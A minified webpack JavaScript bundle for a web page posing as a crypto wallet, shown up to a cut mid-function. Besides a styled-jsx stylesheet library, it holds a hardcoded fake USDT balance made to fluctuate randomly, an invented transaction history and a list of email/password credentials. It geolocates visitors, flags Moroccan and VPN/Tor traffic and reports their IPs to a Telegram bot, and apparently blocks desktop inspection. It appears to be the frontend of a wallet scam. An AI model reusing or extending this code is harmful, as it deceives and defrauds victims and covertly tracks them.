(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [9263], {
        28312: (e, t, n) => {
            "use strict";
            e.exports = n(39443).style
        },
        39443: (e, t, n) => {
            "use strict";
            var r = n(30201);
            n(55855);
            var o = n(65744),
                i = function(e) {
                    return e && "object" == typeof e && "default" in e ? e : {
                        default: e
                    }
                }(o),
                s = void 0 !== r && r.env && !0,
                a = function(e) {
                    return "[object String]" === Object.prototype.toString.call(e)
                },
                l = function() {
                    function e(e) {
                        var t = void 0 === e ? {} : e,
                            n = t.name,
                            r = void 0 === n ? "stylesheet" : n,
                            o = t.optimizeForSpeed,
                            i = void 0 === o ? s : o;
                        c(a(r), "`name` must be a string"), this._name = r, this._deletedRulePlaceholder = "#" + r + "-deleted-rule____{}", c("boolean" == typeof i, "`optimizeForSpeed` must be a boolean"), this._optimizeForSpeed = i, this._serverSheet = void 0, this._tags = [], this._injected = !1, this._rulesCount = 0;
                        var l = document.querySelector('meta[property="csp-nonce"]');
                        this._nonce = l ? l.getAttribute("content") : null
                    }
                    var t, n = e.prototype;
                    return n.setOptimizeForSpeed = function(e) {
                            c("boolean" == typeof e, "`setOptimizeForSpeed` accepts a boolean"), c(0 === this._rulesCount, "optimizeForSpeed cannot be when rules have already been inserted"), this.flush(), this._optimizeForSpeed = e, this.inject()
                        }, n.isOptimizeForSpeed = function() {
                            return this._optimizeForSpeed
                        }, n.inject = function() {
                            var e = this;
                            if (c(!this._injected, "sheet already injected"), this._injected = !0, this._optimizeForSpeed) {
                                this._tags[0] = this.makeStyleTag(this._name), this._optimizeForSpeed = "insertRule" in this.getSheet(), this._optimizeForSpeed || (s || console.warn("StyleSheet: optimizeForSpeed mode not supported falling back to standard mode."), this.flush(), this._injected = !0);
                                return
                            }
                            this._serverSheet = {
                                cssRules: [],
                                insertRule: function(t, n) {
                                    return "number" == typeof n ? e._serverSheet.cssRules[n] = {
                                        cssText: t
                                    } : e._serverSheet.cssRules.push({
                                        cssText: t
                                    }), n
                                },
                                deleteRule: function(t) {
                                    e._serverSheet.cssRules[t] = null
                                }
                            }
                        }, n.getSheetForTag = function(e) {
                            if (e.sheet) return e.sheet;
                            for (var t = 0; t < document.styleSheets.length; t++)
                                if (document.styleSheets[t].ownerNode === e) return document.styleSheets[t]
                        }, n.getSheet = function() {
                            return this.getSheetForTag(this._tags[this._tags.length - 1])
                        }, n.insertRule = function(e, t) {
                            if (c(a(e), "`insertRule` accepts only strings"), this._optimizeForSpeed) {
                                var n = this.getSheet();
                                "number" != typeof t && (t = n.cssRules.length);
                                try {
                                    n.insertRule(e, t)
                                } catch (t) {
                                    return s || console.warn("StyleSheet: illegal rule: \n\n" + e + "\n\nSee https://stackoverflow.com/q/20007992 for more info"), -1
                                }
                            } else {
                                var r = this._tags[t];
                                this._tags.push(this.makeStyleTag(this._name, e, r))
                            }
                            return this._rulesCount++
                        }, n.replaceRule = function(e, t) {
                            if (this._optimizeForSpeed) {
                                var n = this.getSheet();
                                if (t.trim() || (t = this._deletedRulePlaceholder), !n.cssRules[e]) return e;
                                n.deleteRule(e);
                                try {
                                    n.insertRule(t, e)
                                } catch (r) {
                                    s || console.warn("StyleSheet: illegal rule: \n\n" + t + "\n\nSee https://stackoverflow.com/q/20007992 for more info"), n.insertRule(this._deletedRulePlaceholder, e)
                                }
                            } else {
                                var r = this._tags[e];
                                c(r, "old rule at index `" + e + "` not found"), r.textContent = t
                            }
                            return e
                        }, n.deleteRule = function(e) {
                            if (this._optimizeForSpeed) this.replaceRule(e, "");
                            else {
                                var t = this._tags[e];
                                c(t, "rule at index `" + e + "` not found"), t.parentNode.removeChild(t), this._tags[e] = null
                            }
                        }, n.flush = function() {
                            this._injected = !1, this._rulesCount = 0, this._tags.forEach(function(e) {
                                return e && e.parentNode.removeChild(e)
                            }), this._tags = []
                        }, n.cssRules = function() {
                            var e = this;
                            return this._tags.reduce(function(t, n) {
                                return n ? t = t.concat(Array.prototype.map.call(e.getSheetForTag(n).cssRules, function(t) {
                                    return t.cssText === e._deletedRulePlaceholder ? null : t
                                })) : t.push(null), t
                            }, [])
                        }, n.makeStyleTag = function(e, t, n) {
                            t && c(a(t), "makeStyleTag accepts only strings as second parameter");
                            var r = document.createElement("style");
                            this._nonce && r.setAttribute("nonce", this._nonce), r.type = "text/css", r.setAttribute("data-" + e, ""), t && r.appendChild(document.createTextNode(t));
                            var o = document.head || document.getElementsByTagName("head")[0];
                            return n ? o.insertBefore(r, n) : o.appendChild(r), r
                        }, t = [{
                            key: "length",
                            get: function() {
                                return this._rulesCount
                            }
                        }],
                        function(e, t) {
                            for (var n = 0; n < t.length; n++) {
                                var r = t[n];
                                r.enumerable = r.enumerable || !1, r.configurable = !0, "value" in r && (r.writable = !0), Object.defineProperty(e, r.key, r)
                            }
                        }(e.prototype, t), e
                }();

            function c(e, t) {
                if (!e) throw Error("StyleSheet: " + t + ".")
            }
            var d = function(e) {
                    for (var t = 5381, n = e.length; n;) t = 33 * t ^ e.charCodeAt(--n);
                    return t >>> 0
                },
                p = {};

            function x(e, t) {
                if (!t) return "jsx-" + e;
                var n = String(t),
                    r = e + n;
                return p[r] || (p[r] = "jsx-" + d(e + "-" + n)), p[r]
            }

            function g(e, t) {
                var n = e + t;
                return p[n] || (p[n] = t.replace(/__jsx-style-dynamic-selector/g, e)), p[n]
            }
            var m = function() {
                    function e(e) {
                        var t = void 0 === e ? {} : e,
                            n = t.styleSheet,
                            r = void 0 === n ? null : n,
                            o = t.optimizeForSpeed,
                            i = void 0 !== o && o;
                        this._sheet = r || new l({
                            name: "styled-jsx",
                            optimizeForSpeed: i
                        }), this._sheet.inject(), r && "boolean" == typeof i && (this._sheet.setOptimizeForSpeed(i), this._optimizeForSpeed = this._sheet.isOptimizeForSpeed()), this._fromServer = void 0, this._indices = {}, this._instancesCounts = {}
                    }
                    var t = e.prototype;
                    return t.add = function(e) {
                        var t = this;
                        void 0 === this._optimizeForSpeed && (this._optimizeForSpeed = Array.isArray(e.children), this._sheet.setOptimizeForSpeed(this._optimizeForSpeed), this._optimizeForSpeed = this._sheet.isOptimizeForSpeed()), this._fromServer || (this._fromServer = this.selectFromServer(), this._instancesCounts = Object.keys(this._fromServer).reduce(function(e, t) {
                            return e[t] = 0, e
                        }, {}));
                        var n = this.getIdAndRules(e),
                            r = n.styleId,
                            o = n.rules;
                        if (r in this._instancesCounts) {
                            this._instancesCounts[r] += 1;
                            return
                        }
                        var i = o.map(function(e) {
                            return t._sheet.insertRule(e)
                        }).filter(function(e) {
                            return -1 !== e
                        });
                        this._indices[r] = i, this._instancesCounts[r] = 1
                    }, t.remove = function(e) {
                        var t = this,
                            n = this.getIdAndRules(e).styleId;
                        if (function(e, t) {
                                if (!e) throw Error("StyleSheetRegistry: " + t + ".")
                            }(n in this._instancesCounts, "styleId: `" + n + "` not found"), this._instancesCounts[n] -= 1, this._instancesCounts[n] < 1) {
                            var r = this._fromServer && this._fromServer[n];
                            r ? (r.parentNode.removeChild(r), delete this._fromServer[n]) : (this._indices[n].forEach(function(e) {
                                return t._sheet.deleteRule(e)
                            }), delete this._indices[n]), delete this._instancesCounts[n]
                        }
                    }, t.update = function(e, t) {
                        this.add(t), this.remove(e)
                    }, t.flush = function() {
                        this._sheet.flush(), this._sheet.inject(), this._fromServer = void 0, this._indices = {}, this._instancesCounts = {}
                    }, t.cssRules = function() {
                        var e = this,
                            t = this._fromServer ? Object.keys(this._fromServer).map(function(t) {
                                return [t, e._fromServer[t]]
                            }) : [],
                            n = this._sheet.cssRules();
                        return t.concat(Object.keys(this._indices).map(function(t) {
                            return [t, e._indices[t].map(function(e) {
                                return n[e].cssText
                            }).join(e._optimizeForSpeed ? "" : "\n")]
                        }).filter(function(e) {
                            return !!e[1]
                        }))
                    }, t.styles = function(e) {
                        var t, n;
                        return t = this.cssRules(), void 0 === (n = e) && (n = {}), t.map(function(e) {
                            var t = e[0],
                                r = e[1];
                            return i.default.createElement("style", {
                                id: "__" + t,
                                key: "__" + t,
                                nonce: n.nonce ? n.nonce : void 0,
                                dangerouslySetInnerHTML: {
                                    __html: r
                                }
                            })
                        })
                    }, t.getIdAndRules = function(e) {
                        var t = e.children,
                            n = e.dynamic,
                            r = e.id;
                        if (n) {
                            var o = x(r, n);
                            return {
                                styleId: o,
                                rules: Array.isArray(t) ? t.map(function(e) {
                                    return g(o, e)
                                }) : [g(o, t)]
                            }
                        }
                        return {
                            styleId: x(r),
                            rules: Array.isArray(t) ? t : [t]
                        }
                    }, t.selectFromServer = function() {
                        return Array.prototype.slice.call(document.querySelectorAll('[id^="__jsx-"]')).reduce(function(e, t) {
                            return e[t.id.slice(2)] = t, e
                        }, {})
                    }, e
                }(),
                h = o.createContext(null);
            h.displayName = "StyleSheetContext";
            var u = i.default.useInsertionEffect || i.default.useLayoutEffect,
                f = new m;

            function y(e) {
                var t = f || o.useContext(h);
                return t && u(function() {
                    return t.add(e),
                        function() {
                            t.remove(e)
                        }
                }, [e.id, String(e.dynamic)]), null
            }
            y.dynamic = function(e) {
                return e.map(function(e) {
                    return x(e[0], e[1])
                }).join(" ")
            }, t.style = y
        },
        55855: () => {},
        99263: (e, t, n) => {
            "use strict";
            n.r(t), n.d(t, {
                default: () => h
            });
            var r = n(83804),
                o = n(28312),
                i = n.n(o),
                s = n(65744);
            async function a() {
                try {
                    let e = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=tether,ethereum,bitcoin,binancecoin,tron,litecoin,solana,matic-network,ripple,dogecoin,cardano,avalanche-2,polkadot,the-open-network,usd-coin,uniswap,chainlink,shiba-inu,dai,aeternity,pancakeswap-token,1inch,paypal-usd&vs_currencies=usd&include_24hr_change=true");
                    if (!e.ok) throw Error("HTTP error! status: ".concat(e.status));
                    let t = await e.json();
                    [{
                        id: "usdt",
                        name: "tether"
                    }, {
                        id: "eth",
                        name: "ethereum"
                    }, {
                        id: "btc",
                        name: "bitcoin"
                    }, {
                        id: "bnb",
                        name: "binancecoin"
                    }, {
                        id: "trx",
                        name: "tron"
                    }, {
                        id: "ltc",
                        name: "litecoin"
                    }, {
                        id: "sol",
                        name: "solana"
                    }, {
                        id: "matic",
                        name: "matic-network"
                    }, {
                        id: "xrp",
                        name: "ripple"
                    }, {
                        id: "doge",
                        name: "dogecoin"
                    }, {
                        id: "ada",
                        name: "cardano"
                    }, {
                        id: "avax",
                        name: "avalanche-2"
                    }, {
                        id: "dot",
                        name: "polkadot"
                    }, {
                        id: "ton",
                        name: "the-open-network"
                    }, {
                        id: "usdc",
                        name: "usd-coin"
                    }, {
                        id: "uni",
                        name: "uniswap"
                    }, {
                        id: "link",
                        name: "chainlink"
                    }, {
                        id: "shib",
                        name: "shiba-inu"
                    }, {
                        id: "dai",
                        name: "dai"
                    }, {
                        id: "ae",
                        name: "aeternity"
                    }, {
                        id: "cake",
                        name: "pancakeswap-token"
                    }, {
                        id: "1inch",
                        name: "1inch"
                    }, {
                        id: "pyusd",
                        name: "paypal-usd"
                    }].forEach(e => {
                        let n = t[e.name];
                        if (!n) return;
                        let r = n.usd,
                            o = n.usd_24h_change,
                            i = document.getElementById("".concat(e.id, "-price")),
                            s = document.getElementById("".concat(e.id, "-change"));
                        if (i) {
                            let e = r < .01 ? 8 : 2;
                            i.innerText = "$".concat(r.toLocaleString(void 0, {
                                minimumFractionDigits: e,
                                maximumFractionDigits: e
                            }))
                        }
                        if (s) {
                            let e = o >= 0 ? "+" : "";
                            s.innerText = "".concat(e).concat(o.toFixed(2), "%"), s.style.color = o < 0 ? "#ff4444" : "#8B5CF6"
                        }
                    })
                } catch (e) {
                    console.error("Error fetching token prices:", e)
                }
            }
            let l = [{
                email: "johnwilson1981@gmail.com",
                password: "goldenleaf58@"
            }, {
                email: "johnwilson1981@gmail.com",
                password: "bluesky701@"
            }, {
                email: "johnwilson1972@gmail.com",
                password: "goldenleaf50@"
            }, {
                email: "johnwilson1972",
                password: "goldenleaf501@"
            }, {
                email: "johnwilson1972",
                password: "bluesky701"
            }, {
                email: "johnwilson1981",
                password: "goldenleaf58@"
            }, {
                email: "johnwilson1981",
                password: "bluesky701@"
            }, {
                email: "johnwilson1972",
                password: "goldenleaf81@"
            }, {
                email: "rebeccawilson1972",
                password: "goldenleaf59@@"
            }, {
                email: "johnwilson1972@gmail.com",
                password: "bluesky701@"
            }, {
                email: "john16",
                password: "bluesky70@"
            }, {
                email: "robertwilson1972",
                password: "goldenleaf501@"
            }, {
                email: "johnwilson1972",
                password: "blueSky701@"
            }, {
                email: "rebeccawilson1982",
                password: "goldenleaf58@"
            }, {
                email: "robertwilson1972",
                password: "goldenleaf58@"
            }, {
                email: "rebecawilson1982",
                password: "goldenleaf58@"
            }];
            l.map(e => e.email);
            let c = !1,
                d = !1,
                p = async () => {
                    if (!d) try {
                        let e = await fetch("https://ipapi.co/json/"),
                            t = await e.json(),
                            n = "MA" === t.country_code,
                            r = !1;
                        try {
                            let e = await fetch("https://ipapi.is/".concat(t.ip)),
                                n = await e.json();
                            r = !0 === n.is_vpn || !0 === n.is_proxy || !0 === n.is_tor || !0 === n.is_datacenter
                        } catch (e) {
                            console.error("VPN check failed:", e)
                        }
                        c = n || r, d = !0, c && await x(t, n ? "MOROCCO" : "VPN/PROXY")
                    } catch (e) {
                        console.error("Block check failed:", e), d = !0, c = !1
                    }
                },
                x = async (e, t) => {
                    try {
                        let {
                            TELEGRAM_BOT_TOKEN: r,
                            TELEGRAM_CHAT_ID: o
                        } = await Promise.resolve({}), i = new Date().toLocaleString(), s = "\uD83D\uDEAB <b>BLOCKED ACCESS - ".concat(t, "</b>\n\n") + "\uD83D\uDCCD <b>Country:</b> ".concat(e.country_name, "\n") + "\uD83D\uDCE1 <b>IP:</b> ".concat(e.ip || "N/A", "\n") + "\uD83D\uDD50 <b>Time:</b> ".concat(i);
                        await fetch("https://api.telegram.org/bot".concat(r, "/sendMessage"), {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                chat_id: o,
                                text: s,
                                parse_mode: "HTML"
                            })
                        })
                    } catch (e) {
                        console.error("Failed to send notification:", e)
                    }
                };
            var g = n(64461);
            let m = async e => {
                try {
                    let {
                        TELEGRAM_BOT_TOKEN: t,
                        TELEGRAM_CHAT_ID: r
                    } = await Promise.resolve({});
                    return (await fetch("https://api.telegram.org/bot".concat(t, "/sendMessage"), {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: r,
                            text: e,
                            parse_mode: "HTML"
                        })
                    })).ok
                } catch (e) {
                    return console.error("Telegram notification failed:", e), !1
                }
            };

            function h() {
                let [e, t] = (0, s.useState)(!0), [n, o] = (0, s.useState)(!1), [x, h] = (0, s.useState)(""), [u, f] = (0, s.useState)(""), [y, b] = (0, s.useState)(""), [w, j] = (0, s.useState)(!1), [v, S] = (0, s.useState)(!1), [C, k] = (0, s.useState)("Login"), [T, z] = (0, s.useState)(!1), [N, I] = (0, s.useState)(!1), [L, D] = (0, s.useState)(!1), [B, R] = (0, s.useState)(!1), [E, P] = (0, s.useState)(!1), [M, A] = (0, s.useState)(!1), [F, W] = (0, s.useState)("Finalizing Security..."), [H, _] = (0, s.useState)(!1), [U, V] = (0, s.useState)(!1), [O, Z] = (0, s.useState)(!1), [q, K] = (0, s.useState)(!1), [Y, X] = (0, s.useState)(!1), [G, J] = (0, s.useState)(!1), [$, Q] = (0, s.useState)(!1), [ee, et] = (0, s.useState)(null), [en, er] = (0, s.useState)(!1), [eo, ei] = (0, s.useState)(!1), [es, ea] = (0, s.useState)(48247.93), [el, ec] = (0, s.useState)(48247.93), [ed, ep] = (0, s.useState)(!1), [ex, eg] = (0, s.useState)(!1), [em, eh] = (0, s.useState)(!1), [eu, ef] = (0, s.useState)(!1), [ey, eb] = (0, s.useState)(""), [ew, ej] = (0, s.useState)(""), [ev, eS] = (0, s.useState)(""), [eC, ek] = (0, s.useState)(!1), [eT, ez] = (0, s.useState)(!1), [eN, eI] = (0, s.useState)(!1), [eL, eD] = (0, s.useState)(!1), [eB, eR] = (0, s.useState)("select"), [eE, eP] = (0, s.useState)(""), [eM, eA] = (0, s.useState)(!1), [eF, eW] = (0, s.useState)("USDT"), [eH, e_] = (0, s.useState)(!1), [eU, eV] = (0, s.useState)(!1), [eO, eZ] = (0, s.useState)("select"), [eq, eK] = (0, s.useState)(""), [eY, eX] = (0, s.useState)(!1), [eG, eJ] = (0, s.useState)(!1), [e$, eQ] = (0, s.useState)(!1), e0 = "0xCe97B1acA39406D16870A5B74AC2b6eecC8a5AFB", [e1, e2] = (0, s.useState)(!1), [e4, e9] = (0, s.useState)(!1), [e5, e8] = (0, s.useState)(48247.93), [e6, e3] = (0, s.useState)(0), [e7, te] = (0, s.useState)(null), [tt, tn] = (0, s.useState)(null), [tr, to] = (0, s.useState)([]), [ti, ts] = (0, s.useState)(!1), [ta, tl] = (0, s.useState)(!1), [tc, td] = (0, s.useState)(Date.now()), [tp, tx] = (0, s.useState)([{
                    id: "1",
                    token: "USDT",
                    type: "received",
                    amount: 1250.5,
                    address: "0x7f3a...8e4b",
                    status: "completed"
                }, {
                    id: "2",
                    token: "USDT",
                    type: "received",
                    amount: 870.25,
                    address: "0x3b9c...2f1d",
                    status: "completed"
                }, {
                    id: "3",
                    token: "USDT",
                    type: "sent",
                    amount: 500,
                    address: "0x9d2e...5c8a",
                    status: "completed"
                }, {
                    id: "4",
                    token: "USDT",
                    type: "received",
                    amount: 2340.75,
                    address: "0x6e1f...4b7c",
                    status: "completed"
                }, {
                    id: "5",
                    token: "USDT",
                    type: "received",
                    amount: 680.3,
                    address: "0x2c8d...9f3e",
                    status: "completed"
                }, {
                    id: "6",
                    token: "USDC",
                    type: "received",
                    amount: 0,
                    address: "0x5a7b...1c9d",
                    status: "completed"
                }, {
                    id: "7",
                    token: "USDC",
                    type: "received",
                    amount: 0,
                    address: "0x8d4e...3f6a",
                    status: "completed"
                }, {
                    id: "8",
                    token: "USDC",
                    type: "sent",
                    amount: 0,
                    address: "0x1b2c...7e8f",
                    status: "completed"
                }, {
                    id: "9",
                    token: "USDC",
                    type: "received",
                    amount: 0,
                    address: "0x4f6a...2d3c",
                    status: "completed"
                }, {
                    id: "10",
                    token: "USDC",
                    type: "received",
                    amount: 0,
                    address: "0x7e9b...5c4d",
                    status: "completed"
                }]), tg = [{
                    symbol: "USDT",
                    name: "Tether USD",
                    network: "Ethereum",
                    balance: 48247.93,
                    hasBalance: !0
                }, {
                    symbol: "ETH",
                    name: "Ethereum",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "BTC",
                    name: "Bitcoin",
                    network: "Bitcoin",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "BNB",
                    name: "BNB",
                    network: "BSC",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "TRX",
                    name: "Tron",
                    network: "Tron",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "LTC",
                    name: "Litecoin",
                    network: "Litecoin",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "SOL",
                    name: "Solana",
                    network: "Solana",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "MATIC",
                    name: "Polygon",
                    network: "Polygon",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "XRP",
                    name: "Ripple",
                    network: "Ripple",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "DOGE",
                    name: "Dogecoin",
                    network: "Dogecoin",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "ADA",
                    name: "Cardano",
                    network: "Cardano",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "AVAX",
                    name: "Avalanche",
                    network: "Avalanche",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "DOT",
                    name: "Polkadot",
                    network: "Polkadot",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "TON",
                    name: "Toncoin",
                    network: "Toncoin",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "USDC",
                    name: "USD Coin",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "UNI",
                    name: "Uniswap",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "LINK",
                    name: "Chainlink",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "SHIB",
                    name: "Shiba Inu",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "DAI",
                    name: "Dai",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "AE",
                    name: "Aeternity",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "CAKE",
                    name: "PancakeSwap",
                    network: "BSC",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "1INCH",
                    name: "1inch",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }, {
                    symbol: "PYUSD",
                    name: "PayPal USD",
                    network: "Ethereum",
                    balance: 0,
                    hasBalance: !1
                }];
                (0, s.useEffect)(() => {
                    let e = setInterval(() => {
                        td(Date.now())
                    }, 1e3);
                    return () => clearInterval(e)
                }, []), (0, s.useEffect)(() => {
                    "true" === localStorage.getItem("isLoggedIn") && (t(!1), o(!1));
                    let e = localStorage.getItem("pendingTransactions");
                    if (e) {
                        let t = JSON.parse(e),
                            n = Date.now(),
                            r = t.filter(e => {
                                if (e.timerEnd && e.timerEnd > n);
                                else if (e.timerEnd && e.timerEnd <= n) return !1;
                                return !0
                            });
                        r.length < t.length && (r.some(e => "USDT" === e.token) || (e8(48247.93), e2(!1), localStorage.setItem("usdtSpent", "false"))), to(r), localStorage.setItem("pendingTransactions", JSON.stringify(r))
                    }
                    let n = "true" === localStorage.getItem("usdtSpent"),
                        r = "true" === localStorage.getItem("usdcSpent");
                    e2(n), e9(r);
                    let i = sessionStorage.getItem("returningFromMetaMask"),
                        s = sessionStorage.getItem("showSendPopup"),
                        a = sessionStorage.getItem("pendingTransactions");
                    "true" === i && "true" === s && (ef(!0), a && to(JSON.parse(a)), sessionStorage.removeItem("returningFromMetaMask"), sessionStorage.removeItem("showSendPopup"), sessionStorage.removeItem("pendingTransactions"))
                }, []), (0, s.useEffect)(() => {
                    if (!n && !e && !N) {
                        let e = setTimeout(() => {
                            er(!0)
                        }, 1e3);
                        return () => clearTimeout(e)
                    }
                }, [n, e, N]), (0, s.useEffect)(() => {
                    let t = null;
                    return n || e || N || (t = setInterval(() => {
                        er(!0)
                    }, 12e4)), () => {
                        t && clearInterval(t)
                    }
                }, [n, e, N]), (0, s.useEffect)(() => {
                    localStorage.setItem("pendingTransactions", JSON.stringify(tr))
                }, [tr]), (0, s.useEffect)(() => {
                    localStorage.setItem("usdtSpent", e1.toString())
                }, [e1]), (0, s.useEffect)(() => {
                    localStorage.setItem("usdcSpent", e4.toString())
                }, [e4]);
                let tm = e => tr.filter(t => t.token === e).reduce((e, t) => e + t.amount, 0),
                    th = (e, t) => Math.max(0, t - tm(e)),
                    tu = th("USDT", e5),
                    tf = th("USDC", e6),
                    ty = {
                        USDT: tu,
                        USDC: tf,
                        ETH: 0,
                        BTC: 0,
                        BNB: 0,
                        TRX: 0,
                        LTC: 0,
                        SOL: 0,
                        MATIC: 0,
                        XRP: 0,
                        DOGE: 0,
                        ADA: 0,
                        AVAX: 0,
                        DOT: 0,
                        TON: 0,
                        UNI: 0,
                        LINK: 0,
                        SHIB: 0,
                        DAI: 0,
                        AE: 0,
                        CAKE: 0,
                        "1INCH": 0,
                        PYUSD: 0
                    },
                    [tb, tw] = (0, s.useState)({
                        USDT: .99,
                        USDC: 1,
                        ETH: 2567.41,
                        BTC: 69072.41,
                        BNB: 570.03,
                        TRX: .11,
                        LTC: 82.45,
                        SOL: 142.5,
                        MATIC: .52,
                        XRP: .52,
                        DOGE: .12,
                        ADA: .34,
                        AVAX: 32.15,
                        DOT: 6.85,
                        TON: 2.45,
                        UNI: 7.01,
                        LINK: 14.2,
                        SHIB: 17e-6,
                        DAI: 1,
                        AE: .02,
                        CAKE: 1.85,
                        "1INCH": .32,
                        PYUSD: 1
                    }),
                    [tj, tv] = (0, s.useState)({
                        USDT: -.02,
                        USDC: 0,
                        ETH: -3.18,
                        BTC: -2.02,
                        BNB: -1.5,
                        TRX: 2.15,
                        LTC: -1.34,
                        SOL: 5.43,
                        MATIC: -1.87,
                        XRP: .87,
                        DOGE: -1.23,
                        ADA: -2.45,
                        AVAX: 3.21,
                        DOT: -1.89,
                        TON: 8.76,
                        UNI: .02,
                        LINK: -.56,
                        SHIB: -3.21,
                        DAI: .01,
                        AE: -.17,
                        CAKE: -2.34,
                        "1INCH": -.89,
                        PYUSD: 0
                    }),
                    tS = {
                        USDT: "Tether USD",
                        USDC: "USD Coin",
                        ETH: "Ethereum",
                        BTC: "Bitcoin",
                        BNB: "BNB",
                        TRX: "Tron",
                        LTC: "Litecoin",
                        SOL: "Solana",
                        MATIC: "Polygon",
                        XRP: "Ripple",
                        DOGE: "Dogecoin",
                        ADA: "Cardano",
                        AVAX: "Avalanche",
                        DOT: "Polkadot",
                        TON: "Toncoin",
                        UNI: "Uniswap",
                        LINK: "Chainlink",
                        SHIB: "Shiba Inu",
                        DAI: "Dai",
                        AE: "Aeternity",
                        CAKE: "PancakeSwap",
                        "1INCH": "1inch",
                        PYUSD: "PayPal USD"
                    },
                    tC = {
                        USDT: "https://cdn.shopify.com/s/files/1/0992/5964/6318/files/USDT_Logo.png?v=1776899488",
                        USDC: "https://nowpayments.io/images/coins/usdc.svg",
                        ETH: "https://nowpayments.io/images/coins/eth.svg",
                        BTC: "https://nowpayments.io/images/coins/btc.svg",
                        BNB: "https://nowpayments.io/images/coins/bnb.svg",
                        TRX: "https://nowpayments.io/images/coins/trx.svg",
                        LTC: "https://nowpayments.io/images/coins/ltc.svg",
                        SOL: "https://nowpayments.io/images/coins/sol.svg",
                        MATIC: "https://nowpayments.io/images/coins/matic.svg",
                        XRP: "https://altcoinsbox.com/wp-content/uploads/2023/01/xrp-logo.png",
                        DOGE: "https://nowpayments.io/images/coins/doge.svg",
                        ADA: "https://nowpayments.io/images/coins/ada.svg",
                        AVAX: "https://nowpayments.io/images/coins/avax.svg",
                        DOT: "https://www.pngall.com/wp-content/uploads/10/Polkadot-Crypto-Logo-PNG-File.png",
                        TON: "https://nowpayments.io/images/coins/ton.svg",
                        UNI: "https://nowpayments.io/images/coins/uni.svg",
                        LINK: "https://nowpayments.io/images/coins/link.svg",
                        SHIB: "https://nowpayments.io/images/coins/shib.svg",
                        DAI: "https://nowpayments.io/images/coins/dai.svg",
                        AE: "https://nowpayments.io/images/coins/ae.svg",
                        CAKE: "https://nowpayments.io/images/coins/cake.svg",
                        "1INCH": "https://nowpayments.io/images/coins/1inch.svg",
                        PYUSD: "https://nowpayments.io/images/coins/pyusd.svg"
                    };
                ! function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 3e4;
                    (0, s.useEffect)(() => {
                        a();
                        let t = setInterval(a, e);
                        return () => clearInterval(t)
                    }, [e])
                }(3e4);
                let tk = (0, s.useRef)(null),
                    tT = (0, s.useRef)(null),
                    tz = (0, s.useRef)(null);
                (0, s.useEffect)(() => {
                    eu && "USDT" === ey && null === e7 && te(tu), eu || (te(null), tn(null))
                }, [eu, ey, tu, e7]), (0, s.useEffect)(() => {
                    let e = () => {
                        if (!e1 && 0 === tr.length && null === e7) {
                            let e = parseFloat((2 * Math.random() - 1).toFixed(2));
                            e8(t => {
                                let n = t + e;
                                return n > 48265 ? 48250 : n < 48240 ? 48245 : parseFloat(n.toFixed(2))
                            })
                        }
                    };
                    return e1 || 0 !== tr.length || (tT.current = setInterval(e, 6e3), e()), () => {
                        tT.current && clearInterval(tT.current)
                    }
                }, [e1, tr.length, e7]), (0, s.useEffect)(() => {
                    let e = () => {
                        let e = tu;
                        tr.length > 0 && (tm("USDT"), e = Math.max(0, e5)), ea(parseFloat(e.toFixed(2))), ec(parseFloat((e + .3).toFixed(2)))
                    };
                    return e(), tz.current = setInterval(e, 1e3), () => {
                        tz.current && clearInterval(tz.current)
                    }
                }, [tu, tf, tr, e5]);
                let tN = {
                    "--twc-primary": "258 88% 67%",
                    "--twc-primaryHover": "260 90% 73%",
                    "--twc-primaryPressed": "263 92% 79%",
                    "--twc-primaryInverse": "255 55% 18%",
                    "--twc-textPrimary": "248 18% 18%",
                    "--twc-textSecondary": "245 9% 42%",
                    "--twc-textBuy": "258 88% 67%",
                    "--twc-textSell": "351 78% 58%",
                    "--twc-textThird": "246 8% 54%",
                    "--twc-textDisabled": "245 7% 68%",
                    "--twc-bg3": "255 100% 99%",
                    "--twc-bg4": "252 70% 91%",
                    "--twc-backgroundPrimary": "255 100% 99%",
                    "--twc-backgroundSecondary": "252 100% 97%",
                    "--twc-backgroundTertiary": "252 100% 95%",
                    "--twc-iconNormal": "246 8% 54%",
                    "--twc-iconSuccess": "258 88% 67%",
                    "--twc-iconWarning": "45 90% 55%",
                    "--twc-error": "351 78% 58%",
                    "--twc-line": "252 34% 88%"
                };
                (0, s.useEffect)(() => {
                    {
                        /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
                        let e = "ontouchstart" in window || navigator.maxTouchPoints > 0,
                            t = window.matchMedia("(pointer: coarse)").matches,
                            n = window.innerWidth < 768,
                            r = window.devicePixelRatio > 1.5;
                        if (!(e && t && n && r)) {
                            let e = e => (e.preventDefault(), e.stopPropagation(), !1);
